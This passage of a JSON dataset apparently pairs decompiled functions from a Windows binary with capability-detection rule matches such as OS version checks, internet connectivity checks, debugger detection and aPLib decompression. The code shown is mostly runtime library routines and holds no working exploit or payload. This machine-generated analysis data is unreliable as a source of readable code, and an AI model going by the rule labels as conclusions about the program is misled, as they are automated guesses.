uVar5 = uVar5 * 2 | *puVar4 >> 0x1f;\n            *puVar4 = *puVar4 * 2;\n            puVar4[1] = uVar5;\n            puVar4[2] = uVar8;\n        } while ((uVar9 & 0x8000) == 0);\n    }\n    *(puVar4 + 10) = var_4h;\n    return;\n}\n",
        "token_count": 1359
    },
    "0040d80e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040d80e(uint16_t *lpWideCharStr, uint8_t *arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if ((arg_ch != NULL) && (arg_10h != 0)) {\n        if (*arg_ch != 0) {\n            fcn.004023de(arg_14h);\n            if (*(var_10h + 0x14) != 0) {\n                iVar2 = fcn.0040851e(*arg_ch, &var_10h);\n                if (iVar2 == 0) {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                      (*(var_10h + 4), 9, arg_ch, 1, lpWideCharStr, lpWideCharStr != NULL);\n                    if (iVar2 != 0) goto code_r0x0040d85c;\n                }\n                else {\n                    iVar2 = *(var_10h + 0xac);\n                    if ((((1 < iVar2) && (iVar2 <= arg_10h)) &&\n                        (iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                           (*(var_10h + 4), 9, arg_ch, iVar2, lpWideCharStr, lpWideCharStr != NULL), \n                        iVar2 != 0)) || ((*(var_10h + 0xac) <= arg_10h && (arg_ch[1] != 0)))) {\n                        uVar1 = *(var_10h + 0xac);\n                        if (var_4h == '\\0') {\n                            return uVar1;\n                        }\n                        *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n                        return uVar1;\n                    }\n                }\n                puVar3 = fcn.00403a1e();\n                *puVar3 = 0x2a;\n                if (var_4h != '\\0') {\n                    *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n                }\n                return 0xffffffff;\n            }\n            if (lpWideCharStr != NULL) {\n                *lpWideCharStr = *arg_ch;\n            }\ncode_r0x0040d85c:\n            if (var_4h != '\\0') {\n                *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n            }\n            return 1;\n        }\n        if (lpWideCharStr != NULL) {\n            *lpWideCharStr = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 654
    },
    "0040daf3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040daf3(int32_t arg_8h, uint8_t *arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        iVar2 = 0;\n    }\n    else {\n        fcn.004023de(arg_14h);\n        if ((arg_8h == 0) || (arg_ch == NULL)) {\n            puVar1 = fcn.00403a1e();\n            *puVar1 = 0x16;\n            fcn.00403521();\n            if (var_4h != '\\0') {\n                *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n            }\n            iVar2 = 0x7fffffff;\n        }\n        else if (arg_10h < 0x80000000) {\n            if (*(var_10h + 0x14) == 0) {\n                iVar2 = fcn.0040dcb0(arg_8h, arg_ch, arg_10h);\n            }\n            else {\n                arg_8h = arg_8h - arg_ch;\n                do {\n                    iVar2 = fcn.00406ae9(arg_ch[arg_8h], &var_10h);\n                    iVar3 = fcn.00406ae9(*arg_ch, &var_10h);\n                    arg_ch = arg_ch + 1;\n                    arg_10h = arg_10h - 1;\n                    if ((arg_10h == 0) || (iVar2 == 0)) break;\n                } while (iVar2 == iVar3);\n                iVar2 = iVar2 - iVar3;\n            }\n            if (var_4h != '\\0') {\n                *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n            }\n        }\n        else {\n            puVar1 = fcn.00403a1e();\n            *puVar1 = 0x16;\n            fcn.00403521();\n            if (var_4h != '\\0') {\n                *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n            }\n            iVar2 = 0x7fffffff;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 584
    },
    "0040dd5a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nchar * fcn.0040dd5a(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    uVar1 = *(param_1 + 0xc);\n    if ((uVar1 & 0x100) == 0) {\n        uVar4 = *(param_1 + 8);\n        if ((uVar1 & 3) == 0) {\n            if ((uVar1 & 0xc) == 0) {\n                if ((uVar1 & 0x10) == 0) {\n                    pcVar2 = uVar4 * 8 + 0x40fc08;\n                }\n                else {\n                    pcVar2 = uVar4 * 8 + 0x40fc0a;\n                }\n            }\n            else {\n                pcVar2 = uVar4 * 8 + 0x40fc0c;\n            }\n        }\n        else {\n            pcVar2 = uVar4 * 8 + 0x40fc0e;\n        }\n        if (((*pcVar2 != '\\0') && (*pcVar2 != -0x20)) || (pcVar2[1] == '\\0')) {\n            pcVar2 = NULL;\n        }\n    }\n    else {\n        pcVar2 = NULL;\n        iVar3 = 0;\n        uVar4 = 0;\n        do {\n            if (*(uVar4 + 0x40fb90) == *(param_1 + 8)) {\n                iVar3 = iVar3 * 10;\n                if ((uVar1 & 3) != 0) {\n                    return iVar3 + 0x40fb98;\n                }\n                if ((uVar1 & 0xc) != 0) {\n                    return iVar3 + 0x40fb96;\n                }\n                if ((uVar1 & 0x10) != 0) {\n                    return iVar3 + 0x40fb94;\n                }\n                return iVar3 + 0x40fb92;\n            }\n            uVar4 = uVar4 + 10;\n            iVar3 = iVar3 + 1;\n        } while (uVar4 < 0x78);\n    }\n    return pcVar2;\n}\n",
        "token_count": 498
    },
    "004033a6": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20ch\n// WARNING: Variable defined which should be unmapped: var_230h\n// WARNING: Variable defined which should be unmapped: var_234h\n\nvoid __cdecl fcn.004033a6(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint extraout_EDX;\n    uint unaff_EDI;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint *puStackY832;\n    uint *puStackY828;\n    int32_t iStackY824;\n    uint *ExceptionInfo;\n    uint *var_324h;\n    uint var_320h;\n    uint var_31ch;\n    uint var_314h;\n    uint var_2d0h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    int32_t var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint *var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint32_t var_210h;\n    uchar *var_20ch;\n    uint var_208h;\n    uint32_t var_4h;\n    \n    var_4h = *0x412058 ^ &stack0xfffffffc;\n    if (arg_8h != -1) {\n        iStackY824 = arg_8h;\n        puStackY828 = 0x4033cb;\n        fcn.00407aa1();\n    }\n    var_320h = 0;\n    puStackY832 = &fcn.004033a6::var_31ch;\n    iStackY824 = 0x4c;\n    puStackY828 = NULL;\n    fcn.004074b0();\n    ExceptionInfo = &fcn.004033a6::var_320h;\n    var_324h = &fcn.004033a6::var_2d0h;\n    var_22ch = arg_8h;\n    var_210h = (in_NT & 1) * 0x4000 | SCARRY4(&stack0xfffffcc0, 0xc) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100\n               | (&stack0xfffffccc < 0) * 0x80 | (*0x10 == 0x334) * 0x40 | (in_AF & 1) * 0x10 |\n               ((POPCOUNT(&stack0xfffffccc & 0xff) & 1U) == 0) * 4 | 0xfffffff3 < &stack0xfffffcc0 |\n               (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    var_2d0h = 0x10001;\n    var_320h = arg_ch;\n    var_31ch = arg_10h;\n    iStackY824 = 0x403496;\n    var_228h = extraout_EDX;\n    var_220h = var_324h;\n    var_20ch = *0x10;\n    iVar1 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    iStackY824 = 0;\n    puStackY828 = 0x4034a0;\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)();\n    puStackY828 = &fcn.004033a6::ExceptionInfo;\n    puStackY832 = 0x4034ad;\n    iVar2 = (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)();\n    if (((iVar2 == 0) && (iVar1 == 0)) && (arg_8h != -1)) {\n        puStackY832 = arg_8h;\n        fcn.00407aa1();\n    }\n    iStackY824 = 0x4034cd;\n    fcn.00405fff(unaff_EDI);\n    return;\n}\n",
        "token_count": 1006
    },
    "00405560": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405560(int32_t lpFileName, uint32_t arg_ch)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    if ((lpFileName == 0) || ((arg_ch & 0xfffffff9) != 0)) {\n        puVar1 = fcn.00403a31();\n        *puVar1 = 0;\n        puVar1 = fcn.00403a1e();\n        uVar3 = 0x16;\n        *puVar1 = 0x16;\n        fcn.00403521();\n    }\n    else {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetFileAttributesA)(lpFileName);\n        if (uVar2 == 0xffffffff) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.00403a44(uVar3);\n        }\n        else {\n            if ((((uVar2 & 0x10) != 0) || ((uVar2 & 1) == 0)) || ((arg_ch & 2) == 0)) {\n                return 0;\n            }\n            puVar1 = fcn.00403a31();\n            *puVar1 = 5;\n            puVar1 = fcn.00403a1e();\n            *puVar1 = 0xd;\n        }\n        puVar1 = fcn.00403a1e();\n        uVar3 = *puVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 336
    },
    "004075b7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.004075b7(uint param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    while( true ) {\n        iVar1 = fcn.0040bacc(param_1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*0x413544 == 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(uVar2);\n        uVar2 = uVar2 + 1000;\n        if (*0x413544 < uVar2) {\n            uVar2 = 0xffffffff;\n        }\n        if (uVar2 == 0xffffffff) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 172
    },
    "004075fc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004075fc(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    while( true ) {\n        iVar1 = fcn.0040bb60(arg_8h, arg_ch, 0);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*0x413544 == 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(uVar2);\n        uVar2 = uVar2 + 1000;\n        if (*0x413544 < uVar2) {\n            uVar2 = 0xffffffff;\n        }\n        if (uVar2 == 0xffffffff) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 185
    },
    "00408248": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00408248(uint32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *arg_8h_00;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int32_t var_4h;\n    \n    arg_8h_00 = arg_ch;\n    arg_ch = fcn.00408222(arg_ch);\n    uVar1 = arg_8h_00[3];\n    if ((uVar1 & 0x82) == 0) {\n        puVar2 = fcn.00403a1e();\n        *puVar2 = 9;\ncode_r0x0040826e:\n        arg_8h_00[3] = arg_8h_00[3] | 0x20;\n        return 0xffffffff;\n    }\n    if ((uVar1 & 0x40) != 0) {\n        puVar2 = fcn.00403a1e();\n        *puVar2 = 0x22;\n        goto code_r0x0040826e;\n    }\n    if ((uVar1 & 1) != 0) {\n        arg_8h_00[1] = 0;\n        if ((uVar1 & 0x10) == 0) {\n            arg_8h_00[3] = uVar1 | 0x20;\n            return 0xffffffff;\n        }\n        *arg_8h_00 = arg_8h_00[2];\n        arg_8h_00[3] = uVar1 & 0xfffffffe;\n    }\n    uVar1 = arg_8h_00[3];\n    arg_8h_00[3] = uVar1 & 0xffffffef | 2;\n    arg_8h_00[1] = 0;\n    var_4h = 0;\n    if (((uVar1 & 0x10c) == 0) &&\n       (((iVar3 = fcn.0040413d(),  arg_8h_00 != iVar3 + 0x20 && (iVar3 = fcn.0040413d(),  arg_8h_00 != iVar3 + 0x40)) ||\n        (iVar3 = fcn.004081cc(arg_ch),  iVar3 == 0)))) {\n        fcn.0040c961(arg_8h_00);\n    }\n    if ((arg_8h_00[3] & 0x108U) == 0) {\n        iVar3 = 1;\n        var_4h = fcn.0040c645(arg_ch, &arg_8h, 1);\n    }\n    else {\n        iVar4 = arg_8h_00[2];\n        iVar3 = *arg_8h_00 - iVar4;\n        *arg_8h_00 = iVar4 + 1;\n        arg_8h_00[1] = arg_8h_00[6] + -1;\n        if (iVar3 < 1) {\n            if ((arg_ch == 0xffffffff) || (arg_ch == 0xfffffffe)) {\n                iVar4 = 0x412070;\n            }\n            else {\n                iVar4 = (arg_ch & 0x1f) * 0x40 + *((arg_ch >> 5) * 4 + 0x4138a0);\n            }\n            if (((*(iVar4 + 4) & 0x20) != 0) && (iVar5 = fcn.0040c877(arg_ch, 0, 0, 2),  iVar5 == -1))\n            goto code_r0x00408396;\n        }\n        else {\n            var_4h = fcn.0040c645(arg_ch, iVar4, iVar3);\n        }\n        *arg_8h_00[2] = arg_8h;\n    }\n    if (var_4h == iVar3) {\n        return arg_8h & 0xff;\n    }\ncode_r0x00408396:\n    arg_8h_00[3] = arg_8h_00[3] | 0x20;\n    return 0xffffffff;\n}\n",
        "token_count": 941
    },
    "00401a92": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00401a92(uint32_t *arg_8h, uint32_t *arg_ch, uint32_t dwExceptionCode, int32_t arg_14h, ulong *arg_18h, \n            ulong *arg_1ch, int32_t arg_20h)\n\n{\n    uint32_t *puVar1;\n    ulong *puVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    \n    uVar4 = dwExceptionCode;\n    puVar1 = arg_ch;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    if ((dwExceptionCode & 0x10) != 0) {\n        arg_8h[1] = arg_8h[1] | 1;\n        dwExceptionCode = 0xc000008f;\n    }\n    if ((uVar4 & 2) != 0) {\n        arg_8h[1] = arg_8h[1] | 2;\n        dwExceptionCode = 0xc0000093;\n    }\n    if ((uVar4 & 1) != 0) {\n        arg_8h[1] = arg_8h[1] | 4;\n        dwExceptionCode = 0xc0000091;\n    }\n    if ((uVar4 & 4) != 0) {\n        arg_8h[1] = arg_8h[1] | 8;\n        dwExceptionCode = 0xc000008e;\n    }\n    if ((uVar4 & 8) != 0) {\n        arg_8h[1] = arg_8h[1] | 0x10;\n        dwExceptionCode = 0xc0000090;\n    }\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch << 4) ^ arg_8h[2]) & 0x10;\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch * 2) ^ arg_8h[2]) & 8;\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch >> 1) ^ arg_8h[2]) & 4;\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch >> 3) ^ arg_8h[2]) & 2;\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch >> 5) ^ arg_8h[2]) & 1;\n    uVar3 = fcn.004022c8();\n    puVar2 = arg_1ch;\n    if ((uVar3 & 1) != 0) {\n        arg_8h[3] = arg_8h[3] | 0x10;\n    }\n    if ((uVar3 & 4) != 0) {\n        arg_8h[3] = arg_8h[3] | 8;\n    }\n    if ((uVar3 & 8) != 0) {\n        arg_8h[3] = arg_8h[3] | 4;\n    }\n    if ((uVar3 & 0x10) != 0) {\n        arg_8h[3] = arg_8h[3] | 2;\n    }\n    if ((uVar3 & 0x20) != 0) {\n        arg_8h[3] = arg_8h[3] | 1;\n    }\n    uVar4 = *puVar1 & 0xc00;\n    if (uVar4 == 0) {\n        *arg_8h = *arg_8h & 0xfffffffc;\n    }\n    else {\n        if (uVar4 == 0x400) {\n            uVar4 = *arg_8h & 0xfffffffd | 1;\n        }\n        else {\n            if (uVar4 != 0x800) {\n                if (uVar4 == 0xc00) {\n                    *arg_8h = *arg_8h | 3;\n                }\n                goto code_r0x00401bf1;\n            }\n            uVar4 = *arg_8h & 0xfffffffe | 2;\n        }\n        *arg_8h = uVar4;\n    }\ncode_r0x00401bf1:\n    uVar4 = *puVar1 & 0x300;\n    if (uVar4 == 0) {\n        uVar4 = *arg_8h & 0xffffffeb | 8;\ncode_r0x00401c27:\n        *arg_8h = uVar4;\n    }\n    else {\n        if (uVar4 == 0x200) {\n            uVar4 = *arg_8h & 0xffffffe7 | 4;\n            goto code_r0x00401c27;\n        }\n        if (uVar4 == 0x300) {\n            *arg_8h = *arg_8h & 0xffffffe3;\n        }\n    }\n    *arg_8h = *arg_8h ^ (arg_14h << 5 ^ *arg_8h) & 0x1ffe0;\n    arg_8h[8] = arg_8h[8] | 1;\n    if (arg_20h == 0) {\n        arg_8h[8] = arg_8h[8] & 0xffffffe3 | 2;\n        *(arg_8h + 4) = *arg_18h;\n        arg_8h[0x18] = arg_8h[0x18] | 1;\n        arg_8h[0x18] = arg_8h[0x18] & 0xffffffe3 | 2;\n        *(arg_8h + 0x14) = *arg_1ch;\n    }\n    else {\n        arg_8h[8] = arg_8h[8] & 0xffffffe1;\n        arg_8h[4] = *arg_18h;\n        arg_8h[0x18] = arg_8h[0x18] | 1;\n        arg_8h[0x18] = arg_8h[0x18] & 0xffffffe1;\n        arg_8h[0x14] = *arg_1ch;\n    }\n    fcn.004022d8();\n    (*_sym.imp.KERNEL32.dll_RaiseException)(dwExceptionCode, 0, 1, &arg_8h);\n    if ((*(arg_8h + 2) & 0x10) != 0) {\n        *puVar1 = *puVar1 & 0xfffffffe;\n    }\n    if ((*(arg_8h + 2) & 8) != 0) {\n        *puVar1 = *puVar1 & 0xfffffffb;\n    }\n    if ((*(arg_8h + 2) & 4) != 0) {\n        *puVar1 = *puVar1 & 0xfffffff7;\n    }\n    if ((*(arg_8h + 2) & 2) != 0) {\n        *puVar1 = *puVar1 & 0xffffffef;\n    }\n    if ((*(arg_8h + 2) & 1) != 0) {\n        *puVar1 = *puVar1 & 0xffffffdf;\n    }\n    uVar4 = *arg_8h & 3;\n    if (uVar4 == 0) {\n        *puVar1 = *puVar1 & 0xfffff3ff;\n    }\n    else {\n        if (uVar4 == 1) {\n            uVar4 = *puVar1 & 0xfffff7ff | 0x400;\n        }\n        else {\n            if (uVar4 != 2) {\n                if (uVar4 == 3) {\n                    *puVar1 = *puVar1 | 0xc00;\n                }\n                goto code_r0x00401d2c;\n            }\n            uVar4 = *puVar1 & 0xfffffbff | 0x800;\n        }\n        *puVar1 = uVar4;\n    }\ncode_r0x00401d2c:\n    uVar4 = *arg_8h >> 2 & 7;\n    if (uVar4 == 0) {\n        uVar4 = *puVar1 & 0xfffff3ff | 0x300;\n    }\n    else {\n        if (uVar4 != 1) {\n            if (uVar4 == 2) {\n                *puVar1 = *puVar1 & 0xfffff3ff;\n            }\n            goto code_r0x00401d58;\n        }\n        uVar4 = *puVar1 & 0xfffff3ff | 0x200;\n    }\n    *puVar1 = uVar4;\ncode_r0x00401d58:\n    if (arg_20h == 0) {\n        *puVar2 = *(arg_8h + 0x14);\n    }\n    else {\n        *puVar2 = arg_8h[0x14];\n    }\n    return;\n}\n",
        "token_count": 2067
    },
    "004073d0": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong fcn.004073d0(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    bool bVar10;\n    char cVar11;\n    uint32_t uVar9;\n    \n    cVar11 = param_2 < 0;\n    if (cVar11) {\n        bVar10 = param_1 != 0;\n        param_1 = -param_1;\n        param_2 = -bVar10 - param_2;\n    }\n    if (param_4 < 0) {\n        cVar11 = cVar11 + '\\x01';\n        bVar10 = param_3 != 0;\n        param_3 = -param_3;\n        param_4 = -bVar10 - param_4;\n    }\n    uVar3 = param_1;\n    uVar5 = param_3;\n    uVar6 = param_2;\n    uVar9 = param_4;\n    if (param_4 == 0) {\n        uVar3 = param_2 / param_3;\n        iVar4 = (param_2 % param_3 << 0x20 | param_1) / param_3;\n    }\n    else {\n        do {\n            uVar8 = uVar9 >> 1;\n            uVar5 = uVar5 >> 1 | ((uVar9 & 1) != 0) << 0x1f;\n            uVar7 = uVar6 >> 1;\n            uVar3 = uVar3 >> 1 | ((uVar6 & 1) != 0) << 0x1f;\n            uVar6 = uVar7;\n            uVar9 = uVar8;\n        } while (uVar8 != 0);\n        uVar1 = CONCAT44(uVar7, uVar3) / uVar5;\n        iVar4 = uVar1;\n        iVar2 = param_3 * (uVar1 & 0xffffffff);\n        uVar3 = iVar2 >> 0x20;\n        uVar5 = uVar3 + iVar4 * param_4;\n        if (((CARRY4(uVar3, iVar4 * param_4)) || (param_2 < uVar5)) || ((param_2 <= uVar5 && (param_1 < iVar2)))) {\n            iVar4 = iVar4 + -1;\n        }\n        uVar3 = 0;\n    }\n    if (cVar11 == '\\x01') {\n        bVar10 = iVar4 != 0;\n        iVar4 = -iVar4;\n        uVar3 = -bVar10 - uVar3;\n    }\n    return CONCAT44(uVar3, iVar4);\n}\n",
        "token_count": 652
    },
    "00408570": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong fcn.00408570(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    \n    uVar3 = param_1;\n    uVar8 = param_4;\n    uVar6 = param_2;\n    uVar9 = param_3;\n    if (param_4 == 0) {\n        uVar3 = param_2 / param_3;\n        iVar4 = (param_2 % param_3 << 0x20 | param_1) / param_3;\n    }\n    else {\n        do {\n            uVar5 = uVar8 >> 1;\n            uVar9 = uVar9 >> 1 | ((uVar8 & 1) != 0) << 0x1f;\n            uVar7 = uVar6 >> 1;\n            uVar3 = uVar3 >> 1 | ((uVar6 & 1) != 0) << 0x1f;\n            uVar8 = uVar5;\n            uVar6 = uVar7;\n        } while (uVar5 != 0);\n        uVar1 = CONCAT44(uVar7, uVar3) / uVar9;\n        iVar4 = uVar1;\n        iVar2 = param_3 * (uVar1 & 0xffffffff);\n        uVar3 = iVar2 >> 0x20;\n        uVar8 = uVar3 + iVar4 * param_4;\n        if (((CARRY4(uVar3, iVar4 * param_4)) || (param_2 < uVar8)) || ((param_2 <= uVar8 && (param_1 < iVar2)))) {\n            iVar4 = iVar4 + -1;\n        }\n        uVar3 = 0;\n    }\n    return CONCAT44(uVar3, iVar4);\n}\n",
        "token_count": 472
    },
    "00403c80": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\nuint32_t fcn.00403c80(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h_2;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_10h_2;\n    code *pcStack16;\n    uint32_t uStack12;\n    uint var_4h;\n    \n    pcStack16 = fcn.00403da0;\n    var_10h_2 = *in_FS_OFFSET;\n    uStack12 = *0x412058 ^ 0x4100a0;\n    *in_FS_OFFSET = &var_10h_2;\n    var_4h = 0;\n    iVar2 = fcn.00403bf0(0x400000);\n    if (iVar2 != 0) {\n        iVar2 = fcn.00403c30(0x400000, var_8h_2 + -0x400000);\n        if (iVar2 != 0) {\n            uVar1 = *(iVar2 + 0x24);\n            *in_FS_OFFSET = var_10h_2;\n            return ~(uVar1 >> 0x1f) & 1;\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return 0;\n}\n",
        "token_count": 311
    },
    "004060e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004060e0(void)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uchar uVar5;\n    char cVar6;\n    uint8_t *puVar7;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    uint var_51ch;\n    uint lpCPInfo;\n    uint var_512h;\n    uint var_504h;\n    uint var_304h;\n    uint var_204h;\n    uint var_104h;\n    uint32_t var_4h;\n    \n    var_4h = *0x412058 ^ &stack0xfffffffc;\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(*(unaff_ESI + 4), &lpCPInfo);\n    if (iVar3 == 0) {\n        uVar4 = 0;\n        do {\n            pcVar1 = unaff_ESI + 0x11d + uVar4;\n            if (pcVar1 + (-0x61 - (unaff_ESI + 0x11d)) + 0x20 < 0x1a) {\n                puVar7 = unaff_ESI + 0x1d + uVar4;\n                *puVar7 = *puVar7 | 0x10;\n                cVar6 = uVar4 + ' ';\ncode_r0x00406256:\n                *pcVar1 = cVar6;\n            }\n            else {\n                if (pcVar1 + (-0x61 - (unaff_ESI + 0x11d)) < 0x1a) {\n                    puVar7 = unaff_ESI + 0x1d + uVar4;\n                    *puVar7 = *puVar7 | 0x20;\n                    cVar6 = uVar4 + -0x20;\n                    goto code_r0x00406256;\n                }\n                *pcVar1 = '\\0';\n            }\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 0x100);\n    }\n    else {\n        uVar4 = 0;\n        do {\n            *(&var_104h + uVar4) = uVar4;\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 0x100);\n        var_104h._0_1_ = 0x20;\n        if (var_512h != 0) {\n            puVar7 = &var_512h + 1;\n            do {\n                uVar4 = var_512h;\n                if (uVar4 <= *puVar7) {\n                    fcn.004074b0(&var_104h + uVar4, 0x20, (*puVar7 - uVar4) + 1);\n                }\n                var_512h._0_1_ = puVar7[1];\n                puVar7 = puVar7 + 2;\n            } while (var_512h != 0);\n        }\n        fcn.00409483(0, 1, &var_104h, 0x100, &var_504h, *(unaff_ESI + 4), *(unaff_ESI + 0xc), 0);\n        fcn.00409356(0, *(unaff_ESI + 0xc), 0x100, &var_104h, 0x100, &var_204h, 0x100, *(unaff_ESI + 4), 0);\n        fcn.00409356(0, *(unaff_ESI + 0xc), 0x200, &var_104h, 0x100, &var_304h, 0x100, *(unaff_ESI + 4), 0);\n        uVar4 = 0;\n        do {\n            uVar2 = *(&var_504h + uVar4 * 2);\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 & 2) != 0) {\n                    puVar7 = unaff_ESI + 0x1d + uVar4;\n                    *puVar7 = *puVar7 | 0x20;\n                    uVar5 = *(&var_304h + uVar4);\n                    goto code_r0x004061f9;\n                }\n                *(unaff_ESI + 0x11d + uVar4) = 0;\n            }\n            else {\n                puVar7 = unaff_ESI + 0x1d + uVar4;\n                *puVar7 = *puVar7 | 0x10;\n                uVar5 = *(&var_204h + uVar4);\ncode_r0x004061f9:\n                *(unaff_ESI + 0x11d + uVar4) = uVar5;\n            }\n    